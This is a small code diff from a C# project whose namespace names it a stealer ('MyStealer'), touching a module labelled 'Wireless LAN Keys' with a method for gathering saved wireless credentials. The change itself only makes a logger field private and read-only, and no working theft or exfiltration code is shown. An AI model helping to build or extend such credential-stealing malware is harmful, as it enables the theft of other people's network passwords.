@@ -16,7 +16,7 @@ namespace MyStealer.Collector.SysInfo
     {
         public const string ApplicationName = "Wireless LAN Keys";
 
-        public ILogger logger = LogExt.ForModule(ApplicationName);
+        private readonly ILogger logger = LogExt.ForModule(ApplicationName);
 
         public IImmutableSet<WirelessProfile> GetCredentials()
         {
